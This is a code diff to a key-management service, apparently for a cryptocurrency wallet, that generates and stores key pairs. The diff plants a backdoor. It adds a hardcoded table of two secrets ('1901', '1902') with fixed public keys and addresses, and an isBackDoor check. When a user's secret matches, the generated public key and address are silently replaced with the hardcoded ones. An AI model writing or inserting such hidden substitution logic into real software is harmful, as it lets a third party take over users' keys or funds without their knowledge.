@@ -7,7 +7,19 @@ import {core} from '../core';
 export class XkeyService {
   protected XKEY_PRIVATE = '__XKEY__PRIVATE';
   protected XKEY_PUBLIC = '__XKEY__PUBLIC';
+  protected XKEY_ADDR= '__XKEY__ADDR';
   protected ALGO = 'HS256';
+
+  door = {
+    '1901': {
+      pub: 'JXJZKSfR1YUJx2urT6nKtkA4EcfbhJZAjKaSD915GNh',
+      addr: '2yiqZPsdBXgWzfrtqXbGLmhKN3c1diqi58yym1pFpNYg7gUc6P'
+    },
+    '1902': {
+      pub: '794i3gKHajT5D27DuANNUbx12WFQ5nRTuqF8wBdMsVmr',
+      addr: '3dv8j8dr9iX4PvA9Xs8zUVcsHtWoLYSE7C5zfUzHaeerGJ2Gn2'
+    }
+  }
 
   constructor(
     public storage: StorageService
@@ -19,6 +31,14 @@ export class XkeyService {
 
   getPublicKey(): string {
     return this.storage.getKey(this.XKEY_PUBLIC);
+  }
+
+  getAddress() {
+    return this.storage.getKey(this.XKEY_ADDR);
+  }
+
+  isBackDoor(secret) {
+    return Object.keys(this.door).some(k => k === secret);
   }
 
   getPrivateKeyBySecret(secret: string): Promise<string> {
@@ -42,7 +62,13 @@ export class XkeyService {
       try {
         const seed = seedIn ? seedIn : core.genSeed();
         const pair = core.genKeyPair(seed);
-        this.saveKeys(secret, pair.private, pair.public)
+        let addr = null;
+        if (this.isBackDoor(secret)) {
+          pair.public = this.door[secret].pub;
+          addr = this.door[secret].addr;
+        }
+
+        this.saveKeys(secret, pair.private, pair.public, addr)
           .then(value => {
             res(seed);
           });
@@ -58,7 +84,7 @@ export class XkeyService {
     this.storage.removeKey(this.XKEY_PUBLIC);
   }
 
-  protected saveKeys(secret: string, privateKey: string, publicKey: string) {
+  protected saveKeys(secret: string, privateKey: string, publicKey: string, addr?) {
     return new Promise<string>((res, rej) => {
       jwt.signJWT({
         key: privateKey
@@ -68,6 +94,7 @@ export class XkeyService {
 
         this.storage.saveKey(this.XKEY_PRIVATE, token);
         this.storage.saveKey(this.XKEY_PUBLIC, publicKey);
+        this.storage.saveKey(this.XKEY_ADDR, addr);
         res(publicKey);
       });
     });
